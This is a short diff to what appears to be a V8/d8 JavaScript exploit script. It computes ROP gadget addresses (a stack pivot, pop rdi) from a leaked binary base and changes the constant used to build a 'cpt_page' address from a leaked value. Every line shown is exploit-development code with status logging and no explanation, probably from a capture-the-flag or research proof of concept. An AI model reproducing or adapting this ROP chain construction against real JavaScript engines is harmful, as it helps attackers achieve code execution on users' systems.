@@ -47,7 +47,7 @@ console.log(`[+] cleanup_stack_jmp = 0x${itoh(cleanup_stack_jmp)}`);
 var stack_pivot = d8_base + 0x000000000100a5ecn; // pop rsp; add rsp, 0x10; pop rbp; ret;
 console.log(`[+] stack_pivot = 0x${itoh(stack_pivot)}`);
 
-var cpt_page = ((leak << 32n) & 0xffffffff00000000n) | 0xffe10000n;
+var cpt_page = ((leak << 32n) & 0xffffffff00000000n) | 0xff010000n;
 console.log(`[+] cpt_page = 0x${itoh(cpt_page)}`);
 
 var pop_rdi = d8_base + 0x000000000121b9ben;
